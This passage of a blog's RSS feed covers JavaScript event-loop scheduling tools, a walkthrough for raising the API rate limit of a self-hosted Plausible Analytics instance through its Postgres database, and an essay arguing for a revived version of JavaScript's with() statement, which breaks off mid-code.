	document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
		const box = document.getElementById(&apos;box&apos;);

    	// Allow the box to render.
		box.style.display = &apos;&apos;;

		// Measure the actual height.
		const height = `${box.clientHeight}px`;

		// Set a starting height of 0 pixels.
 		box.style.height = &apos;0px&apos;;

		// Before the next repaint.
		requestAnimationFrame(() =&amp;gt; {
            
            // After the next repaint. 
			requestAnimationFrame(() =&amp;gt; {
				box.style.height = height;
			});
		});
	});
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That nested &lt;code&gt;requestAnimationFrame()&lt;/code&gt; is critical. In order for the animation to be invoked, the updated &lt;code&gt;height&lt;/code&gt; value must be applied &lt;em&gt;after&lt;/em&gt; the browser&apos;s had a chance to repaint after setting the initial &lt;code&gt;0px&lt;/code&gt; height. Without it, those two DOM changes will be batched together, and the open box will just &quot;pop&quot; onto the screen. &lt;/p&gt;&lt;p&gt;Here&apos;s a simple demonstration of how &lt;code&gt;requestAnimationFrame()&lt;/code&gt; animates it as desired.&lt;/p&gt;&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/WNabaPW?ref=cms.macarthur.me&quot;&gt;
  Blog Post :: Navigating the Event Loop :: Opening Box w/ Dynamic Height&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;This particular tool is one that keeps surprising me with its applications. It&apos;s personally starling how useful it is to schedule work around the browser&apos;s repaint cycle.&lt;/p&gt;&lt;h3&gt;#4. requestIdleCallback(() =&amp;gt; {})&lt;/h3&gt;&lt;p&gt;This one&apos;s best for executing lower-priority code at any future turn of the event loop, whenever the browser consider itself to be &quot;idle,&quot; or &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Background_Tasks_API?ref=cms.macarthur.me&quot;&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Background_Tasks_API?ref=cms.macarthur.me&quot;&gt;as MDN &lt;/a&gt;states&lt;/a&gt;: &quot;when it determines that there is free time to do so.&quot;&lt;/p&gt;&lt;p&gt;It stands apart from the other tools here because there&apos;s really no telling on which turn of the event loop a callback will be fired. By using it, priority is ceded to other, more important tasks. In its simplest form, throw some work into &lt;code&gt;requestIdleCallback()&lt;/code&gt;, and whenever the browser has a minute, it&apos;ll be queued for execution: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;requestIdleCallback(() =&amp;gt; {
	console.log(&quot;low priority stuff.&quot;)
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But it also gives you additional tooling for fine-tuning. Your callback will receive an &lt;code&gt;IdleDeadline&lt;/code&gt; object indicating approximately how much time you have remaining in the current idle period. And that can be useful for scheduling a larger task that might need to be broken up over multiple idle periods.&lt;/p&gt;&lt;p&gt;For example, let&apos;s say your application has built collection of messages it wants to eventually send whenever the thread is idle. The provided &lt;code&gt;IdleDeadline&lt;/code&gt; can help you process as many as possible during the browser&apos;s downtime, and then put off any remaining messages until the &lt;em&gt;next&lt;/em&gt; idle period: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const messages = [&apos;first&apos;, &apos;second&apos;, &apos;third&apos;];

function processMessage(message) {
	console.log(&apos;processing:&apos;, message);
}

function processMessages(deadline) {
	// We&apos;ve got messages to process &amp;amp; time available.
    while (deadline.timeRemaining() &amp;gt; 0 &amp;amp;&amp;amp; messages.length) {
		const message = messages.shift();

		processMessage(message);
	}

    // Ran out of time. Schedule remaining messages for next time.
	if (messages.length) {
		requestIdleCallback(processMessages);
	}
}

requestIdleCallback(processMessages);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The only word of caution with this one is that, at the moment, it&apos;s &lt;em&gt;not&lt;/em&gt; supported by Safari. That said, it&apos;s simple enough to wire up a &lt;a href=&quot;https://github.com/behnammodi/polyfill/blob/master/window.polyfill.js?ref=cms.macarthur.me&quot;&gt;fallback/polyfill&lt;/a&gt;, so you&apos;ll get the benefit of running low-priority work on uncongested event loop iterations for &lt;a href=&quot;https://caniuse.com/requestidlecallback?ref=cms.macarthur.me&quot;&gt;the bulk of your users&lt;/a&gt;.&lt;/p&gt;&lt;h2&gt;The TL;DR&lt;/h2&gt;&lt;p&gt;That&apos;s a lot. Here&apos;s a summary of when I&apos;d reach for these tools, depending on when it&apos;s in your best interest to schedule work. &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;setTimeout(() =&amp;gt; {}, 0)&lt;/code&gt; - You&apos;d like to spread high-priority work over multiple event loop turns, in order to avoid preventing all other tasks on the main thread from being handled.&lt;/li&gt;&lt;li&gt;&lt;code&gt;queueMicrotask(() =&amp;gt; {})&lt;/code&gt; - You have a piece of work is relatively less important than what&apos;s currently on the call stack, but you still want it to be completed before the event loop allows &lt;em&gt;anything&lt;/em&gt; else to happen. &lt;/li&gt;&lt;li&gt;&lt;code&gt;requestAnimationFrame(() =&amp;gt; {})&lt;/code&gt; - You want something to happen in coordination with the repaint cycle – usually right before or after a repaint has occurred. &lt;/li&gt;&lt;li&gt;&lt;code&gt;requestIdleCallback(() =&amp;gt; {})&lt;/code&gt; - You have some low-priority work to complete, but you&apos;re fine with doing it whenever the event loop has some downtime. &lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;What&apos;s Missing?&lt;/h2&gt;&lt;p&gt;I know for a fact that there are several other tools out there for navigating the event loop in the ways described here, and probably even with other important considerations I haven&apos;t mentioned. If there&apos;s something you find yourself reaching for that&apos;s missing here, don&apos;t hesitate to share!&lt;/p&gt;</content:encoded></item><item><title>Raise the API Rate Limit for a Self-Hosted Instance of Plausible</title><link>https://macarthur.me/posts/increase-plausible-rate-limits</link><guid isPermaLink="true">https://macarthur.me/posts/increase-plausible-rate-limits</guid><pubDate>Tue, 02 Jan 2024 06:12:56 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been using the &lt;a href=&quot;https://plausible.io/self-hosted-web-analytics?ref=cms.macarthur.me&quot;&gt;self-hosted version&lt;/a&gt; of Plausible Analytics for a couple of years now, and &lt;a href=&quot;https://macarthur.me/posts/moving-from-google-analytics-to-plausible?ref=cms.macarthur.me&quot;&gt;I&apos;ve really enjoyed it&lt;/a&gt;. One of the many perks of the self-hosted model is that I&apos;m able to do what I want with my data as often as I want to do it. &lt;/p&gt;&lt;p&gt;For example: this is statically generated site. Every time it builds, I pull in the latest analytics data from the Plausible REST API to render on various pages, including my &lt;a href=&quot;https://macarthur.me/dashboard?ref=cms.macarthur.me&quot;&gt;personal dashboard&lt;/a&gt;. By default, there&apos;s a rate limit set in place – 600 requests/hour. That&apos;s usually a suitable default, but it&apos;s occasionally not. &lt;/p&gt;&lt;p&gt;Fortunately, being self-hosted, it&apos;s easy enough to raise that limit to something astronomical. Let&apos;s walk through it. Heads up: I&apos;m assuming you&apos;re on a virtual machine that you can access via SSH (mine&apos;s on DigitalOcean).&lt;/p&gt;&lt;h2&gt;Accessing Plausible&apos;s Postgres Database&lt;/h2&gt;&lt;p&gt;Access the machine and &lt;code&gt;cd&lt;/code&gt; to wherever your instance of Plausible is living: &lt;/p&gt;&lt;figure&gt;&lt;pre&gt;&lt;code&gt;# replace with your VM&apos;s IP address:
ssh root@123.456.789.101

# replace with wherever your instance lives:
cd /opt/plausible&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;&lt;p&gt;&lt;span&gt;..&lt;/span&gt;&lt;/p&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Next, we&apos;ll need to find the name of the container in which Plausible&apos;s Postgres database is running. Run &lt;code&gt;docker ps&lt;/code&gt; and you&apos;ll see a list of running containers. You&apos;re looking for the name assigned to the one using the &quot;postgres:VERSION&quot; image:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-4.png&quot; alt=&quot;list of running containers&quot; loading=&quot;lazy&quot; width=&quot;1162&quot; height=&quot;226&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-4.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-4.png 1000w, https://cms.macarthur.me/content/images/2024/01/image-4.png 1162w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Now, we&apos;ll access that container with &lt;code&gt;psql&lt;/code&gt;, logging in under the &lt;code&gt;postgres&lt;/code&gt; user:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker exec -ti plausible_plausible_db_1 psql -U postgres&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Running &lt;code&gt;\l&lt;/code&gt; should show every database running in the container: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-1.png&quot; alt=&quot;list of every database running in the Docker container&quot; loading=&quot;lazy&quot; width=&quot;1460&quot; height=&quot;422&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-1.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-1.png 1000w, https://cms.macarthur.me/content/images/2024/01/image-1.png 1460w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Run &lt;code&gt;\c plausible_db&lt;/code&gt; to connect to the database we&apos;ll need: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1292&quot; height=&quot;122&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-2.png 1000w, https://cms.macarthur.me/content/images/2024/01/image-2.png 1292w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;We&apos;re in. Next up, let&apos;s find the table and raise that API limit. &lt;/p&gt;&lt;h3&gt;Raising the API Key Limit&lt;/h3&gt;&lt;p&gt;The table we&apos;ll need to update is &lt;code&gt;api_keys&lt;/code&gt;. Just for sanity&apos;s sake, go a head and view the records in there. Assuming you&apos;ve already generated a token (if you haven&apos;t, do it), you&apos;ll see something similar to this:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/01/image-3.png&quot; alt=&quot;example of API key records&quot; loading=&quot;lazy&quot; width=&quot;1660&quot; height=&quot;442&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/01/image-3.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/01/image-3.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/01/image-3.png 1600w, https://cms.macarthur.me/content/images/2024/01/image-3.png 1660w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As might&apos;ve guessed, we&apos;re interested in that &lt;code&gt;hourly_request_limit&lt;/code&gt; field. That field is an &lt;code&gt;integer&lt;/code&gt; type, which has a &lt;a href=&quot;https://www.postgresql.org/docs/current/datatype-numeric.html?ref=cms.macarthur.me#DATATYPE-NUMERIC&quot;&gt;maximum value&lt;/a&gt; of 2,147,483,647. So, let&apos;s update it: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;UPDATE public.api_keys SET hourly_request_limit = 2147483647;&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;You did it.&lt;/h2&gt;&lt;p&gt;But before you move on, keep a couple of things in mind: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;This change won&apos;t impact any keys you add in the future. If you add any later, you&apos;ll need to run through this process again.&lt;/li&gt;&lt;li&gt;There are reasons rate limits exist in the first place. You&apos;re virtually removing it here, so think about the potential performance and security implications of that decision. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Hope this is useful to someone!&lt;/p&gt;</content:encoded></item><item><title>Let&apos;s Bring Back JavaScript&apos;s `with()` Statement</title><link>https://macarthur.me/posts/with</link><guid isPermaLink="true">https://macarthur.me/posts/with</guid><pubDate>Fri, 29 Dec 2023 18:03:32 GMT</pubDate><content:encoded>&lt;p&gt;It&apos;s hard not to appreciate the elegance of Kotlin&apos;s &lt;a href=&quot;https://kotlinlang.org/docs/scope-functions.html?ref=cms.macarthur.me&quot;&gt;scope functions&lt;/a&gt;, which allow you to tap into object and immediately execute a block of code against it. I often reach for &lt;code&gt;also&lt;/code&gt;, &lt;code&gt;run&lt;/code&gt;, and &lt;code&gt;let&lt;/code&gt;, but &lt;code&gt;with&lt;/code&gt; is up there too. Pass an object, and you can access specific properties with no identifier: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;data class Person(
	val firstName: String,
	val lastName: String,
	val wasRight: Boolean
)

val miltonFriedman = Person(
	firstName = &quot;Milton&quot;,
	lastName = &quot;Friedman&quot;,
	wasRight = true
)

val fullName = with(miltonFriedman) {
	&quot;$firstName $lastName&quot; &amp;lt;-- slick!
}
    
print(fullName) // &quot;Milton Friedman&quot;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Up until recently, I didn&apos;t know JavaScript has something with a similar vibe – its own version of &lt;code&gt;with&lt;/code&gt;. It&apos;s &lt;a href=&quot;https://tc39.es/ecma262/multipage/ecmascript-language-statements-and-declarations.html?ref=cms.macarthur.me#sec-with-statement&quot;&gt;effectively deprecated&lt;/a&gt;, and it won&apos;t work at all in strict mode, but its still something to marvel at, even in light of the reasons it&apos;s discouraged. And I&apos;ve love to see a world in which we bring (at least some version of) it back. &lt;/p&gt;&lt;p&gt;Let&apos;s spend some time reviewing what &lt;code&gt;with()&lt;/code&gt; does, its common criticisms, and my own objections to those criticisms.&lt;/p&gt;&lt;h2&gt;An Overview of Accessing Properties w/ &lt;code&gt;with()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;When you access properties on a JavaScript object, you almost always need to &lt;em&gt;qualify&lt;/em&gt; those properties with an identifier so the engine knows where it can find a value. The one exception is global variables. If a variable by that name doesn&apos;t exist up the scope chain, it&apos;s checked as a property of &lt;code&gt;window&lt;/code&gt; or &lt;code&gt;globalThis&lt;/code&gt;. Like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const name = &apos;Bob&apos;;

const person = {
	name: &apos;Milton Friedman&apos;,
	wasRight: true
}

// Searches the &quot;person&quot; object:
console.log(person.name); &apos;Milton Friedman&apos;

// Searches the scope chain, then &quot;window&quot; or &quot;globalThis&quot;:
console.log(name); // &apos;Bob&apos;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;with&lt;/code&gt; statement gives you access to properties on an object &lt;em&gt;without&lt;/em&gt; a qualifying identifier. You simply reference them as standalone variables.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const person = {
	name: &apos;Milton Friedman&apos;,
	wasRight: true
}

with(person) {
	console.log(name); // &apos;Milton Friedman&apos;
	console.log(wasRight); // `true`
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This works because &lt;code&gt;with()&lt;/code&gt; wedges &lt;code&gt;person&lt;/code&gt; into the beginning of the scope chain, meaning the target object will first be searched for a value before moving up any further. As an aside, you can still access variables from broader scope – you just need to rely on that explicit identifier:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;window.name = &quot;Bob&quot;;

with(person) {
	console.log(window.name); // &quot;Bob&quot;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In some ways, it offers an ergonomic benefit similar to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment?ref=cms.macarthur.me&quot;&gt;destructuring assignment&lt;/a&gt;. Instead of needing to repeat an identifier, there&apos;s a little less syntactic bloat. But as an added benefit, the code executed inside &lt;code&gt;with()&lt;/code&gt; is contained to a distinct block scope.&lt;/p&gt;&lt;h2&gt;Why is it deprecated?&lt;/h2&gt;&lt;p&gt;If you look at the &lt;a href=&quot;https://tc39.es/ecma262/multipage/ecmascript-language-statements-and-declarations.html?ref=cms.macarthur.me#prod-WithStatement&quot;&gt;TC39 documentation&lt;/a&gt;, the &lt;code&gt;with()&lt;/code&gt; statement is marked as &quot;legacy&quot; and discouraged from use, but it doesn&apos;t go into a lot of depth as to why. If you look elsewhere, however, a few main reasons come up. (It&apos;s very possible I&apos;m missing some other key objections, by the way. If you have them, let me know.)&lt;/p&gt;&lt;h3&gt;#1. Poor Readability&lt;/h3&gt;&lt;p&gt;Without an explicit identifier, it&apos;s possible to write some confusing code that&apos;s difficult to read. Look at this function:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function doSomething(name, obj) {
  with (obj) {
    console.log(name);
  }
    
  console.log(name);
}

doSomething(&quot;Bob&quot;, { name: &quot;Alex&quot; });
// &quot;Alex&quot;
// &quot;Bob&quot;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At first glance, it&apos;s not clear what &lt;code&gt;name&lt;/code&gt; is referring to – a property on &lt;code&gt;obj&lt;/code&gt; or the parameter passed to the function. And the same variable name refers to completely different values throughout the function body. It&apos;s confusing and might trip you up. After all, depending on where that variable is used, resolving its scope will be performed very differently.&lt;/p&gt;&lt;p&gt;This is a good critique, but in my opinion, not a lethal one. It&apos;s the developer&apos;s (poor) choice to write code like this, and seems like something largely solved by education.&lt;/p&gt;&lt;h3&gt;#2. Scope Leak / Unintended Property Access&lt;/h3&gt;&lt;p&gt;Beyond that that, due to its design, you can inadvertently run into problems by accessing properties within a different scope you didn&apos;t intend to handle. Let&apos;s say you have a function that processes historical events contained in &quot;country&quot; objects.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const israel = {
  history: [&apos;event1&apos;, &apos;event2&apos;],
};

function processHistory(country) {
  with (country) {
	// do something with `history`...
  }
}

processHistory(israel);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This&apos;ll work fine until you pass a country with no &lt;code&gt;history&lt;/code&gt; property. In that event, &lt;code&gt;history&lt;/code&gt; will fall back to &lt;code&gt;window.history&lt;/code&gt; (or some other &lt;code&gt;history&lt;/code&gt; variable that exists up the scope chain), causing unexpected issues.&lt;/p&gt;&lt;p&gt;In this simple example, the problem could be a non-issue if &lt;code&gt;history&lt;/code&gt; is a required property (TypeScript could help if the object were created via object literal, but it&apos;s very easy to bypass if you&apos;re composing objects through other means), but I can see other surprises popping up in more complex scenarios. You&apos;re modifying the scope chain. At some point, &lt;a href=&quot;http://jibbering.com/faq/names/event_handler.html?ref=cms.macarthur.me&quot;&gt;weird things are bound to happen&lt;/a&gt;. So, I&apos;m somewhat sympathetic to this point. &lt;/p&gt;&lt;h4&gt;Update: Important Historical Context&lt;/h4&gt;&lt;p&gt;When I originally wrote this post, I wasn&apos;t thinking about how significantly the parameters of this conversation have changed over the past number of years, particularly throughout the transition between ES5 and ES2015. Then, Sean May dropped some really useful context &lt;a href=&quot;https://macarthur.me/posts/with?ref=cms.macarthur.me#comment-432&quot;&gt;in a comment below&lt;/a&gt;. He illustrates how scope management in JavaScript was far more like the wild west before &lt;code&gt;const&lt;/code&gt;, &lt;code&gt;let&lt;/code&gt;, and modules gave us more fine-grained control over it. It really has me wondering how this all would&apos;ve turned out if those tools had existed from the beginning. Skip down and read that comment if you haven&apos;t!&lt;/p&gt;&lt;h3&gt;#3. Performance Challenges&lt;/h3&gt;&lt;p&gt;Things get a little more interesting when they relate to performance. In my view, it&apos;s the strongest criticism I&apos;ve seen.&lt;/p&gt;&lt;p&gt;When a property is accessed within a &lt;code&gt;with&lt;/code&gt; statement, it&apos;s value is searched not only within the top-level properties of the given object, but the entire prototype chain. And if it&apos;s not found there, it&apos;ll then search up from scope to scope. This search order necessarily happens for every property access. Depending on the application, that can make for some slow look-ups and performance foot guns. &lt;/p&gt;&lt;p&gt;A quick illustration. We&apos;re using &lt;code&gt;with&lt;/code&gt; to access properties on &lt;code&gt;me&lt;/code&gt;, which is at the bottom of a prototype chain:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const creature = { name: &apos;creature&apos;, planet: &apos;earth&apos; };
const mammal = Object.create(creature, { name: { value: &apos;mammal&apos; } });
const human = Object.create(mammal, { name: { value: &apos;human&apos; } });
const me = Object.create(human, { name: { value: &apos;alex&apos; } });

function outerFunction() {
	const outer = &apos;outer&apos;;

	function innerFunction() {
		const inner = &apos;inner&apos;;

		with (me) {
			console.log(
                name, 
                planet, 
                inner, 
                outer
            );
            // &apos;me&apos; &apos;earth&apos; &apos;inner&apos; &apos;outer&apos;
		}
	}

	innerFunction();
}

outerFunction();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since &lt;code&gt;name&lt;/code&gt; exists directly on the object, there&apos;s not much overhead in looking it up. Remember – the target object&apos;s top-level properties are the first to be searched. But &lt;code&gt;planet&lt;/code&gt; is different. It&apos;s not on &lt;code&gt;me&lt;/code&gt;, so every single object in the prototype chain is searched for a value until it&apos;s found.&lt;/p&gt;&lt;p&gt;And even though &lt;code&gt;inner&lt;/code&gt; and &lt;code&gt;outer&lt;/code&gt; are distinct variables that don&apos;t exist anywhere in the prototype chain, &lt;em&gt;that entire chain is searched &lt;/em&gt;before those other variables are read. Pretty wasteful, at least in contrived circumstances like this, designed to illustrate a point.&lt;/p&gt;&lt;h2&gt;A Commonly Recommended Alternative&lt;/h2&gt;&lt;p&gt;In order to get the same &quot;clean&quot; variable handling but without these risks, destructuring assignment is often recommended. Using the inheritance example from before:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const creature = { name: &apos;creature&apos;, planet: &apos;earth&apos; };
const mammal = Object.create(creature, { name: { value: &apos;mammal&apos; } });
const human = Object.create(mammal, { name: { value: &apos;human&apos; } });
const me = Object.create(human, { name: { value: &apos;me&apos; } });

const { name, planet } = me;

console.log(name, planet);
// `me` `earth`&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I understand why it&apos;s the suggested alternative: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;There&apos;s less ambiguity about where the variables are coming from.&lt;/li&gt;&lt;li&gt;The compiler can make better assumptions (and optimizations) about where properties are being accessed, which is good for performance (although, the prototype chain is still searched, so that cost will still exist).&lt;/li&gt;&lt;li&gt;You still get to use the variables without an identifier.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;But from a readability standpoint, I&apos;m not totally sold on it being a worthy alternative. &lt;/p&gt;&lt;h3&gt;Why &lt;code&gt;with()&lt;/code&gt; is (Sometimes) Superior to Destructuring Assignment&lt;/h3&gt;&lt;p&gt;The appeal of using &lt;code&gt;with()&lt;/code&gt; isn&apos;t only in the &quot;clean&quot; variables. It&apos;s in the control structure. Due to the syntax around it, it&apos;s very easy to cognitively &quot;bucket&quot; a particular task inside a &lt;code&gt;with()&lt;/code&gt; statement. That code is set aside from the rest, both in lexical scope and purpose, making it easier to reason about. &lt;/p&gt;&lt;p&gt;Imagine you&apos;re handling an HTTP request that passes some information in the request, and you somehow get access to it in a &lt;code&gt;data&lt;/code&gt; variable. Your objective is to use particular properties to save a record to the database. Here&apos;s how you might used destructured properties:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const { imageUrl, width, height } = data;

await saveToDb({
  imageUrl,
  width,
  height,
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s fine, but it takes a line to pluck off those variables. Plus, they&apos;re all now block-scoped, and could clash with whatever else is going on in the method. There might be a couple of responses at this point: &lt;/p&gt;&lt;p&gt;&lt;em&gt;&quot;Just move the code into its own method.&quot;&lt;/em&gt; I don&apos;t hate idea. It might even be a good from a OOP design perspective – the parent method would be kept slimmer and focused. But this suggestion also feels primarily like a solution to a problem introduced by choosing to use destructuring assignment, and that could&apos;ve been eased using the semantics of &lt;code&gt;with()&lt;/code&gt;. Depending on whatever else is going on, I might not &lt;em&gt;want&lt;/em&gt; to create a distinct method, but would still like that distinct scope.&lt;/p&gt;&lt;p&gt;&lt;em&gt;&quot;Wrap it all in a one-off block.&quot;&lt;/em&gt; That &lt;code&gt;const&lt;/code&gt; is block-scoped, which means it could be contained by creating a new block scope with curly braces:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const imageUrl = &quot;different-image.jpg&quot;;

{
 	const { imageUrl, width, height } = data;

	await saveToDb({
  		imageUrl,
		width,
		height,
	});   
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are points to be awarded here for cleverness, but there&apos;s no way you can convince me it&apos;s more readable. It&apos;s not a hack, but it kinda feels like one. &lt;/p&gt;&lt;h3&gt;Same Story, Using &lt;code&gt;with()&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;Now, here&apos;s the same thing, but this time, it&apos;s accomplished via &lt;code&gt;with&lt;/code&gt; statement: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;with (data) {
  await saveToDb({
    imageUrl,
    width,
    height,
  });
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the benefits aren&apos;t clear:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The control structure paired with &lt;code&gt;with&lt;/code&gt; makes it very clear that something specific&apos;s gonna happen concerning &lt;code&gt;data&lt;/code&gt; and saving something to the database.&lt;/li&gt;&lt;li&gt;Thanks to shorthand property names, I don&apos;t need to first destructure values from &lt;code&gt;data&lt;/code&gt; before passing them to my method. Saves me a line.&lt;/li&gt;&lt;li&gt;None of the variables can bleed into other parts of the containing method.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;I still think destructuring assignment is a useful feature (I use it a lot), but at least in terms of readability and semantics, it doesn&apos;t quite cut it as a drop-in alternative for &lt;code&gt;with()&lt;/code&gt;.&lt;/p&gt;&lt;h2&gt;But what about those performance concerns?&lt;/h2&gt;&lt;p&gt;Yeah, let&apos;s talk about those. By the nature of how &lt;code&gt;with()&lt;/code&gt; is designed to operate, it&apos;s definitely not the most &lt;em&gt;strictly optimal&lt;/em&gt; way to handle object properties. But I question just how serious of a concern that is in light of what&apos;s actually going on in the code, and weighed against the ergonomic and legibility gains. &lt;/p&gt;&lt;p&gt;Consider this example. In most of the &lt;code&gt;with()&lt;/code&gt; cases I&apos;ve seen, the objects people are using aren&apos;t terribly complex. They&apos;re often just simple key/pairs. So, I made a pretty large one compared to most of these cases. It&apos;s a list of every U.S. state: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const states = {
	alabama: &apos;AL&apos;,
	alaska: &apos;AK&apos;,
	arizona: &apos;AZ&apos;,
	arkansas: &apos;AR&apos;,
	california: &apos;CA&apos;,
    //... the rest of them.
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I then ran a quick benchmark test on logging out each of those values. One test used &lt;code&gt;with()&lt;/code&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;with (states) {
    console.log(alabama, alaska, /* ...the rest */);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the other used destructuring assignment: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const { alabama, alaska, /* ...the rest */ } = states;

console.log(alabama, alaska, /* ...the rest */);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As expected, &lt;code&gt;with()&lt;/code&gt; was slower, by about 23% overall: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-16.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1604&quot; height=&quot;938&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-16.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-16.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/12/image-16.png 1600w, https://cms.macarthur.me/content/images/2023/12/image-16.png 1604w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But if you look at those numbers a little longer and contextualize them in the real world, the difference is pretty much &quot;meh.&quot; After all, you&apos;re dealing in &lt;em&gt;tens of thousands of operations in a second&lt;/em&gt;. &lt;/p&gt;&lt;p&gt;Don&apos;t get me wrong. That &lt;em&gt;could &lt;/em&gt;make a&lt;em&gt; &lt;/em&gt;very meaningful difference in an environment highly sensitive to execution performance. But those scenarios are likely few, and they probably shouldn&apos;t be using JavaScript anyway. They&apos;d be written in PHP, obviously. &lt;/p&gt;&lt;p&gt;On top of that, it&apos;s worth calling out that &lt;code&gt;with()&lt;/code&gt; is far from the only JavaScript feature that can backfire in performance when used inappropriately. Just one example: the spread operator feels really nice to write, but if it&apos;s not used carefully in the context of the rest of our code, &lt;a href=&quot;https://jpcamara.com/2023/03/07/making-tanstack-table.html?ref=cms.macarthur.me&quot;&gt;things can get gross real fast.&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;Still... can we make it faster? &lt;/h2&gt;&lt;p&gt;I&apos;d love to see a world in which a &quot;better&quot; version of &lt;code&gt;with()&lt;/code&gt; comes back in glory, with a few tweaks for improved performance. &lt;/p&gt;&lt;p&gt;A very specific change I wouldn&apos;t mind seeing is &lt;strong&gt;no longer searching the prototype chain.&lt;/strong&gt; The new &amp;amp; improved &lt;code&gt;with()&lt;/code&gt; would only consider the top-level properties on an object returned from &lt;code&gt;Object.getOwnPropertyNames()&lt;/code&gt;. This change would reduce the amount of time it takes to resolve variables, especially if you&apos;re accessing those outside the &lt;code&gt;with()&lt;/code&gt; context altogether. &lt;/p&gt;&lt;p&gt;A benchmark a promising benchmark related to this. I made an object with 100 key/value pairs, and whose prototype chain was 100 levels deep. Each level had that same set of key/value pairs. Here&apos;s the scrappy code used to make it:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function makeComplicatedObject() {
	const obj = Object.fromEntries(
		Array.from({ length: 100 }).map((_, index) =&amp;gt; [
			`key_${index}`,
			`value_${index}`,
		])
	);

	return obj;
}

// result: 100 key/value pairs, prototype chain 100 levels deep
const deeplyNestedObject = Array.from({ length: 100 }).reduce(
